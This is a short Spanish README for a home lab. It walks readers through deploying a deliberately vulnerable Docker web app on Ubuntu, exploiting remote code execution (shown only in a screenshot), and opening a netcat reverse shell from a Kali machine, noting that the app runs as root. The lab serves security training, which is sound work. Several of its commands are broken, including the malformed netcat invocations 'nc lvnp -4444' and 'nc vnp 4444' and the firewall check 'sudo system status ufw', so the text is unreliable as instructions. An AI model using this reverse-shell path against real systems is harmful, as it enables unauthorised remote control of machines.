# simpleReverseShell
Laboratorio para tener una reverse shell de forma simple.

## Pasos previos: Instalar ubuntu, kali y colocarlos en una red interna, siguiendo los pasos del PDF:

[Máquinas en red interna lab.pdf](https://github.com/user-attachments/files/28428915/Maquinas.en.red.interna.lab.pdf)

> Nota: Es probable que las configuraciones de Firewall estén desactivadas en su ISO de Ubuntu. Puede verificar usando `sudo system status ufw`, `sudo nft list ruleset`, en tal caso, omita los pasos de desactivación de Firewall.

## Posteriormente:

### Nota: En el host con Ubuntu

## Paso 1: Descarga el archivo lab-app-compressed.zip y descomprime.
Puedes descomprimir usando el comando: `unzip lab-app-compressed.zip`

## Paso 2: Ejecuta los siguientes comandos para instalar docker y plugins
`sudo apt update`
`sudo apt install docker.io docker-compose-plugin -y`

## Paso 3: Asegúrate de esta en el directorio en el que descomprimiste lo descargado y despliega la app
`sudo docker build -t vulnerable-app .`
`sudo docker run -d --name vulnerable-app -p 5000:5000 vulnerable-app`

> Nota: Para asegurarte que esté runeando la app, puedes usar el comando: `sudo docker ps` y debe salir algo como STATUS UP x seconds.

## Paso 4: Remote Code Execution

<img width="1195" height="679" alt="image" src="https://github.com/user-attachments/assets/1cfdd069-39f1-4506-a5e6-389277726619" />

## Paso 5: Reverse Shell
Allí, con netcat, puedes iniciar una reverse shell: nc lvnp -4444 desde tu host y nc vnp 4444 desde el host externo, en la línea de comandos mostrada, adicionalmente, todo es viable, puesto que fue ejecutado como root.

Suerte.
At. Ana
